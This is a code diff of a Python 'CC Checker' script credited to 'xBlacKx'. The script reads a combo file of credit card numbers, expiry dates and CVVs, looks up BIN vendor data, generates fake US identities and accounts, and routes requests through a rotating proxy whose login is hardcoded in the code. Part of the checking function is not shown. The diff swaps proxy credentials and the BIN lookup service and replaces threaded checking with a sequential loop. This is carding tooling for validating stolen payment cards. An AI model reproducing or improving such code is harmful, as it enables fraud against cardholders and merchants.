@@ -1,4 +1,3 @@
-#!/usr/bin/python
 # -*- coding: utf-8 -*-
 #============== Moudles ==============#
 import requests
@@ -6,7 +5,6 @@ from requests.exceptions import ProxyError
 import json, string, re
 import os, time, random, platform, colorama
 from colorama import Fore, Back, Style
-from concurrent.futures import ThreadPoolExecutor
 colorama.init()
 #============== Moudles ==============#
 def get_email(): 
@@ -30,22 +28,22 @@ def checker(cc):
 	cvv = splitter[3]
 	bin = cc[:6]
 
-	arr = ['http://ovfmnxzz-rotate:i0gsqs7jfm2a@p.webshare.io:80/']
+	arr = ['http://bqqqfxeo-rotate:071h9m2354ed@p.webshare.io:80/']
 
 	proxy = random.choice(arr)
 	proxies = { 'http' : proxy, 'https' : proxy}
 
-	res = requests.get("https://jocastabins.herokuapp.com/api/" + bin)
+	res = requests.get("https://xblackxcoder.codes/bin/" + bin)
 	bin_data = json.loads(res.text)
-	vendor = bin_data["data"]["vendor"].lower()
+	vendor = bin_data["vendor"].lower()
 	
 	curl =  requests.Session()
 	curl.proxies = proxies
 	res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
-	random_data = json.loads(res.text)                                
+	random_data = json.loads(res.text)                      
 
 	first_name = random_data['results'][0]['name']['first']
-	last_name = random_data['results'][0]['name']['last']                               
+	last_name = random_data['results'][0]['name']['last']                     
 	email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
 	password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
 
@@ -142,19 +140,16 @@ def checker(cc):
 
 if __name__ == '__main__':
 
-    while(True):
-        os.system('cls' if platform.system() == 'Windows' else 'clear')
-        print(Fore.RED+requests.get("http://artii.herokuapp.com/make?text=CC Checker").text)
-        print(Fore.GREEN+'By xBlacKx | @xBlackx_Coder | Channel:- @xBlackxCoder')
-        print('')
+	os.system('cls' if platform.system() == 'Windows' else 'clear')
+	print(Fore.RED+requests.get("http://artii.herokuapp.com/make?text=CC Checker").text)
+	print(Fore.GREEN+'By xBlacKx | @xBlackx_Coder | Channel:- @xBlackxCoder')
+	print('')
 
-        try:
-            inpFile = input("Enter Your CC Combo File : ")
-            threads = []
-            with open(inpFile) as NumList:
-                argFile = NumList.read().splitlines()
-            with ThreadPoolExecutor(max_workers=50) as executor: #Defaulted To 50 threads
-                for data in argFile:
-                    threads.append(executor.submit(checker, data))
-        except Exception as e:
-            print(e)
+	try:
+		inpFile = input("Enter Your CC Combo File : ")
+		file = open(inpFile).readlines()
+		for lines in file:
+			line = lines.replace('\n','')
+			checker(lines)
+	except Exception as e:
+		print(e)
